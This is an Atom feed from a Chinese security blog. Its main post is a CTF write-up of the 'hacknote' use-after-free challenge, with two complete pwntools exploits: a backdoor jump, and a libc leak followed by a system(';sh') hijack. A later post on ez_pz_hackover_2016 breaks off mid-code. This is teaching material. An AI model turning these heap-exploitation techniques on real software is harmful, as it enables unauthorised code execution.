<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>mutou-jun&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-09-24T02:09:07.463Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>木头</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>堆重启_uaf_hacknote</title>
    <link href="http://yoursite.com/2020/09/23/%E5%A0%86%E9%87%8D%E5%90%AF_uaf_hacknote/"/>
    <id>http://yoursite.com/2020/09/23/堆重启_uaf_hacknote/</id>
    <published>2020-09-22T16:05:48.000Z</published>
    <updated>2020-09-24T02:09:07.463Z</updated>
    
    <content type="html"><![CDATA[<p>Typora果然比有道云好用多了。test下图片功能。</p><a id="more"></a><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://blog.eonew.cn/archives/<span class="number">490</span></span><br><span class="line">https://blog.csdn.net/weixin_44864859/article/details/<span class="number">107181869</span></span><br></pre></td></tr></table></figure><p>这里记录下经典的含有后门的UAF漏洞程序。//hacknote    最简单的堆题目      libc 2.23</p><p>以及 含后门的UAF漏洞程序 //hacknote</p><p>先看第一个含有后门的UAF漏洞程序：</p><h2 id="查看文件相关属性及开启保护"><a href="#查看文件相关属性及开启保护" class="headerlink" title="查看文件相关属性及开启保护"></a>查看文件相关属性及开启保护</h2><p>32位elf程序，没有去符号。// 给源代码会更香。</p><p> 只开启了NX保护。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ file hacknote_backdoor </span><br><span class="line">hacknote_backdoor: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, </span><br><span class="line">interpreter /lib/ld-linux.so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">44</span>ee75c492628b3691cdcdb07759e9bbe551644a, <span class="keyword">not</span> stripped</span><br><span class="line"></span><br><span class="line">$ checksec  hacknote_backdoor  </span><br><span class="line">[*] </span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><h2 id="ida代码分析："><a href="#ida代码分析：" class="headerlink" title="ida代码分析："></a>ida代码分析：</h2><p><img src="https://s1.ax1x.com/2020/09/23/wXRF7q.png" alt="wXRF7q.png"></p><p>add_note:</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRAA0.png" alt="wXRAA0.png"></p><p>其中 print_note_content函数为：</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRiBn.png" alt="wXRiBn.png"></p><p>del_note:</p><p><img src="https://s1.ax1x.com/2020/09/23/wXR9Xj.png" alt="wXR9Xj.png"></p><p>print_note:</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRPns.png" alt="wXRPns.png"></p><p>另外程序中含有 后门：</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRENV.png" alt="wXRENV.png"></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>创建2个0x18大写的chunk 此时：</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRe9U.png" alt="wXRe9U.png"></p><p> 然后依次删除 结构体下标为 0 和 1</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRVhT.png" alt="wXRVhT.png"></p><p>然后我们申请 个 和固定大小一致的结构体即可。</p><p>往新申请的content_addr中 写入 后门函数地址。</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRm3F.png" alt="wXRm3F.png"></p><p>最后 只要 print 结构体即可 拿到shell。</p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp:"></a>完整exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p=process(<span class="string">"./hacknote_backdoor"</span>)</span><br><span class="line"><span class="comment">#p=remote("node3.buuoj.cn",29525)</span></span><br><span class="line">elf=ELF(<span class="string">"./hacknote_backdoor"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16)</span></span><br><span class="line"><span class="string">print "text_base : "+hex(text_base)</span></span><br><span class="line"><span class="string">print "jiegoutishuzu : "+hex(text_base+0x202040)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">magic=<span class="number">0x08048945</span></span><br><span class="line">notelist=<span class="number">0x0804A048</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"\x11"</span>*<span class="number">8</span>)<span class="comment">#1 #2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"\x22"</span>*<span class="number">8</span>)<span class="comment">#3 #4</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">pd=p32(magic)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,pd)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="无后门的hacknote"><a href="#无后门的hacknote" class="headerlink" title="无后门的hacknote"></a>无后门的hacknote</h2><p>如果题目把后门去掉呢？这里同时也去除了符号。除此之外，程序其它几乎一摸一样.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file hacknote </span><br><span class="line">hacknote: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped</span><br><span class="line">    </span><br><span class="line">$ checksec hacknote </span><br><span class="line">[*] </span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><p>这里先把 此程序的 数据结构给写下呢。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">note</span> //0<span class="title">x10</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> (* <span class="built_in">puts</span>)(note *);</span><br><span class="line">    <span class="keyword">char</span> *note_content;</span><br><span class="line">&#125;note;</span><br><span class="line"></span><br><span class="line">note *ptr[<span class="number">5</span>];</span><br></pre></td></tr></table></figure><h2 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h2><p>因为没有后门，那么首先的一件事就是 去leak libc.</p><p>这题在add函数中，maloc一个size=0x10的chunk作为note结构体，然后又申请一个任意大小(我们可控制的)的chunk作为note_content的指针。</p><p>所以 我们可以去申请一个unsigned 大小的chunk，然后再将它给delete掉，便可以leak libc_base,</p><p>嗯嗯，其实并不会，因为这题 在打印 note_content的时候，会调用 该结构体中的  void (* puts)(note *)函数。而在我们将它给delete 的时候会将它给置空。导致 无法进行 打印。那么我们要怎么做呢。</p><p>这里我原本去想，我们继续和上面有后门的时候一样操作，先申请两个 size不等于0x10的chunk，然后分别进行delete，然后再申请 一个size=0x10的chunk，并在新 malloc的chunk中 写入   void (* puts)(note <em>) 以及 __libc_start_main的got地址。但这样 我们接下来 就最多只能再malloc 两个结构体了。这样就无法完成 向 某一个 结构体中 void (</em> puts)(note *); 给改成 system了。//这里进行了尝试 og一个都不可以成功。</p><p>所以这里就需要另外的一种做法了。</p><p>刚才所说的思路，在首先进行申请两个 size不等于0x10的chunk，然后再将它分别删除，然后再申请，这无疑一下子 将fastbin上的free chunk给利用完了。  而因为 这题限制了 最多我们最多可malloc 5次。</p><p>于是 我们可以首先 申请一个 unsigned 大小的chunk，以及一个size=0x10 大小的chunk，然后将它们分别进行delete(这里要特别注意，先delete unsigned 的chunk，后delete 0x10的chunk，原因是 我们可重复对  0x10的结构体 含有的两个chunk 进行利用。)</p><p>最后还需要注意的一点就是 在 getshell的步骤中，我们构造pd2=p32(system_addr)+”;sh”，而不是</p><p>pd2=p32(system_addr)+p32(binsh)，原因是 print函数中  传的参数是 *note_content .</p><h2 id="完整exp-："><a href="#完整exp-：" class="headerlink" title="完整exp ："></a>完整exp ：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p=process(<span class="string">"./hacknote"</span>)</span><br><span class="line"><span class="comment">#p=remote("node3.buuoj.cn",29525)</span></span><br><span class="line">elf=ELF(<span class="string">"./hacknote"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16)</span></span><br><span class="line"><span class="string">print "text_base : "+hex(text_base)</span></span><br><span class="line"><span class="string">print "jiegoutishuzu : "+hex(text_base+0x202040)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">notelist=<span class="number">0x0804A050</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"step1: leak libc "</span>+<span class="string">"************************************************"</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x11"</span>*<span class="number">8</span>)<span class="comment">#0 #1</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">"\x22"</span>*<span class="number">8</span>)<span class="comment">#2 #3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_func=<span class="number">0x0804862B</span></span><br><span class="line">__libc_start_main=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">pd=p32(puts_func)+p32(__libc_start_main)</span><br><span class="line">add(<span class="number">0x8</span>,pd)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u32(p.recv(<span class="number">4</span>))-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base is : "</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#binsh = libc.search("/bin/sh").next()+libc_base</span></span><br><span class="line"><span class="comment">#print "binsh is "+ hex(binsh)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr is "</span>+hex(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"step2: get shell "</span>+<span class="string">"*************************************************"</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd2=p32(system_addr)+<span class="string">";sh"</span><span class="comment">#p32(binsh)</span></span><br><span class="line">add(<span class="number">0x8</span>,pd2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Typora果然比有道云好用多了。test下图片功能。&lt;/p&gt;
    
    </summary>
    
    
      <category term="堆重启" scheme="http://yoursite.com/tags/%E5%A0%86%E9%87%8D%E5%90%AF/"/>
    
  </entry>
  
  <entry>
    <title>疯狂的木头08</title>
    <link href="http://yoursite.com/2020/09/14/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B408/"/>
    <id>http://yoursite.com/2020/09/14/疯狂的木头08/</id>
    <published>2020-09-13T21:01:04.000Z</published>
    <updated>2020-09-13T21:29:03.388Z</updated>
    
    <content type="html"><![CDATA[<p>最后一次了。你再继续颓废下去，就没有人等你了~</p><a id="more"></a><h2 id="又是一个漫长的夜晚"><a href="#又是一个漫长的夜晚" class="headerlink" title="又是一个漫长的夜晚"></a>又是一个漫长的夜晚</h2><blockquote><p>真的太长时间没有更了，不过这无疑给我一个很清楚的认识：不记录，不反思，脑子就会特别乱，没有长进。一直想一个人静静待着，实验室不想去，也不想与人交流，也不想学习。太可怕，我得自救呢。</p></blockquote><h2 id="持续记录"><a href="#持续记录" class="headerlink" title="持续记录"></a>持续记录</h2><blockquote><p>不被束缚，忠于内心。</p></blockquote><blockquote><p><a href="https://imgchr.com/i/wBUyWR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/14/wBUyWR.png" alt="wBUyWR.png"></a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最后一次了。你再继续颓废下去，就没有人等你了~&lt;/p&gt;
    
    </summary>
    
    
      <category term="疯狂的木头" scheme="http://yoursite.com/tags/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B4/"/>
    
  </entry>
  
  <entry>
    <title>今天你pwn了吗(三)</title>
    <link href="http://yoursite.com/2020/04/30/%E4%BB%8A%E5%A4%A9%E4%BD%A0pwn%E4%BA%86%E5%90%97(%E4%B8%89)/"/>
    <id>http://yoursite.com/2020/04/30/今天你pwn了吗(三)/</id>
    <published>2020-04-30T15:57:04.000Z</published>
    <updated>2020-04-30T18:46:35.726Z</updated>
    
    <content type="html"><![CDATA[<p>小题。。。</p><a id="more"></a><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>同样的，在开始之前我们先来看下几个 函数吧，一定要 好好学下遇到的函数呢，很重要的：</p><p>fgets</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">函数原型：<span class="keyword">char</span> * fgets ( <span class="keyword">char</span> * <span class="keyword">str</span>, <span class="keyword">int</span> num, FILE * stream );</span><br><span class="line">函数功能：</span><br><span class="line">从流中读取字符，并将它们作为C字符串存储到<span class="keyword">str</span>中，直到已读取（num<span class="number">-1</span>）个字符或到达换行符或到达文件末尾（以先发生的为准）。</span><br><span class="line">换行符使fgets停止读取，但是该函数将其视为有效字符并包含在复制到<span class="keyword">str</span>的字符串中。</span><br><span class="line">复制到<span class="keyword">str</span>的字符后会自动附加一个终止的空字符。</span><br><span class="line">请注意，fgets与gets完全不同：fgets不仅接受流参数，而且还允许指定<span class="keyword">str</span>的最大大小，并在字符串中包括任何结尾的换行符。</span><br></pre></td></tr></table></figure><p>memchr</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">函数原型：<span class="keyword">const</span> <span class="keyword">void</span> * <span class="built_in">memchr</span>（<span class="keyword">const</span> <span class="keyword">void</span> * ptr，<span class="keyword">int</span> value，<span class="keyword">size_t</span> num）;</span><br><span class="line">       <span class="keyword">void</span> * <span class="built_in">memchr</span>（<span class="keyword">void</span> * ptr，<span class="keyword">int</span> value，<span class="keyword">size_t</span> num）;</span><br><span class="line">函数功能：在内存块中找到字符</span><br><span class="line">        在ptr指向的内存块的前num个字节内搜索值的首次出现（解释为无符号字符），并返回指向它的指针。</span><br><span class="line">        在比较时，在ptr数组上检查的值和每个字节都被解释为无符号字符。</span><br></pre></td></tr></table></figure><p>strcmp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">函数原型：<span class="function"><span class="keyword">int</span> <span class="title">strcmp</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> * str1, <span class="keyword">const</span> <span class="keyword">char</span> * str2 )</span></span>;</span><br><span class="line">函数功能：比较两个字符串比较C字符串str1和C字符串str2。这个函数开始比较每个字符串的第一个字符。</span><br><span class="line">        如果它们彼此相等，则继续执行下列对操作，直到字符不同或到达终止空字符为止。</span><br><span class="line">        这个函数执行字符的二进制比较。</span><br><span class="line">        有关考虑特定于语言环境的规则的函数，请参阅strcoll。</span><br><span class="line">返回值：</span><br><span class="line">        返回一个整数值，指示字符串之间的关系：</span><br><span class="line">        返回值指示</span><br><span class="line">        &lt;<span class="number">0</span>,   第一个不匹配的字符在ptr1中的值比在ptr2中的值低</span><br><span class="line">        =<span class="number">0</span>,  两个字符串的内容相等</span><br><span class="line">        &gt;<span class="number">0</span>,  第一个不匹配的字符在ptr1中的值大于在ptr2中的值</span><br></pre></td></tr></table></figure><p>memcpy():</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">函数原型：<span class="keyword">void</span> * memcpy ( <span class="keyword">void</span> * destination, <span class="keyword">const</span> <span class="keyword">void</span> * source, size_t <span class="built_in">num</span> );</span><br><span class="line">函数功能：复制内存块 内存复制块将<span class="built_in">num</span>字节的值从源指向的位置直接复制到目标指向的内存块。</span><br><span class="line"></span><br><span class="line">        源指针和目标指针指向的对象的底层类型与此函数无关;结果是数据的二进制副本。</span><br><span class="line">        该函数不检查源中的任何终止<span class="keyword">null</span>字符—它总是精确地复制<span class="built_in">num</span>字节。</span><br><span class="line">        为了避免溢出，目标和源参数都指向的数组的大小至少应该是<span class="built_in">num</span>字节，并且不应该重叠(对于重叠的内存)</span><br><span class="line">        </span><br><span class="line">特别注意：拷贝的字节数 只以 <span class="built_in">num</span> 控制。</span><br></pre></td></tr></table></figure><h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>环境：Ubuntu 16.04</p><p>首先查看下文件属性：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">ez_pz_hackover_2016</span></span><br><span class="line"><span class="attr">ez_pz_hackover_2016:</span> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib/ld-,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.32</span><span class="string">,</span> </span><br><span class="line"><span class="string">BuildID[sha1]=341701ef5091cd200a5fc401bc3a826e3d131086,</span> <span class="string">not</span> <span class="string">stripped</span></span><br><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">ez_pz_hackover_2016</span></span><br><span class="line"><span class="string">[*]</span> </span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Full</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">disabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br><span class="line">    <span class="attr">RWX:</span>      <span class="string">Has</span> <span class="string">RWX</span> <span class="string">segments</span></span><br></pre></td></tr></table></figure><p>可以看到  是 32位的elf 程序，且 没有开启任何 保护，<br>于是 首先考虑shellcode 的方式去pwn 掉程序。<br>看下ida：（留意下 代码中的 注释）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  header();</span><br><span class="line">  chall();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">**********************************************************************</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">header</span><span class="params">()</span>                 <span class="comment">//header 其实没有什么的。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"             ___ ____\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"      ___ __| _ \\_  /\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"     / -_)_ /  _// / \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"     \\___/__|_| /___|\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"        lemon squeezy\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">********************************************************************</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">chall</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-40Ch]</span></span><br><span class="line">  _BYTE *v3; <span 